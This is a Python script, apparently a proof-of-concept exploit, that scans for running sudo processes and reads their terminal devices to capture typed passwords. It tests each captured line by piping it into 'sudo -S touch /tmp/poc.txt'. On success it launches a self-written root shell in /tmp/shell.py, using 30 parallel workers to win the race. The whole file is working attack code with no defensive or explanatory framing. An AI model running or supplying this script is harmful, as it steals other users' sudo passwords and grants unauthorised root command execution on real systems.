import psutil
import getpass
import os
import multiprocessing
from time import sleep


def find_user_sudo_processes_with_tty():
    circuit = True
    current_user = getpass.getuser()

    for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
        try:
            if proc.info['name'] == 'sudo':
                    tty = proc.terminal()  # Get TTY device (e.g., /dev/pts/3)
                    with open(tty, 'r') as f:
                         while circuit:
                             val = f.readline()
                             command_string = f"echo \"{val.strip()}\" | sudo -S touch /tmp/poc.txt"
                             #command_string = f"echo \"{val.strip()}\" | sudo -S python3 /tmp/shell.py"
                             if os.system(command_string) == 0:
                                 with open("/tmp/gotit.txt", 'w') as out:
                                     out.write(str(os.getpid()))
                                 print("\n+ Succeeded sudo touch, spawning shell +")
                                 command_string = f"echo \"{val.strip()}\" | sudo -S python3 /tmp/shell.py"
                                 os.system(command_string)
                                 circuit = False
                         return circuit
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    return True

def write_shell():
    shell = '''import os
import sys

ttyval = ""

with open('/tmp/mytty.txt', 'r') as f:
     ttyval = f.readline()
sys.stdin = open(ttyval.strip(), "r")

while True:
    try:
        user_in = input(">")
        if "exit" in user_in:
            break
        print(os.system(user_in))
    except Exception as e:
        print(str(e))
        pass'''
    with open("/tmp/shell.py", 'w') as g:
        g.write(shell)
    g.close()

def target_func():
    while find_user_sudo_processes_with_tty():
         continue
def create_workers(processes_ids):
    for i in range(1, 31):
        value = multiprocessing.Process(target=target_func)
        value.start()
        print(f"-Worker {i} Started-")
        processes_ids[str(value.pid)] = value
    return processes_ids

if __name__ == "__main__":
    write_shell()
    os.system("tty > /tmp/mytty.txt")
    if os.path.exists("/tmp/gotit.txt"):
        os.remove("/tmp/gotit.txt")
    processes_ids = {}
    print("+ Looking for sudo processes +")
    print("+ Starting worker processes +")
    processes_ids = create_workers(processes_ids)
    while True:
        if os.path.exists("/tmp/gotit.txt"):
             with open("/tmp/gotit.txt", 'r') as m:
                 pid_val = m.readline()
             break
        sleep(5)
    the_proc = processes_ids.get(pid_val.strip())

    for value in processes_ids.values():
        if value != the_proc:
            value.terminate()
            value.join()
    the_proc.join()
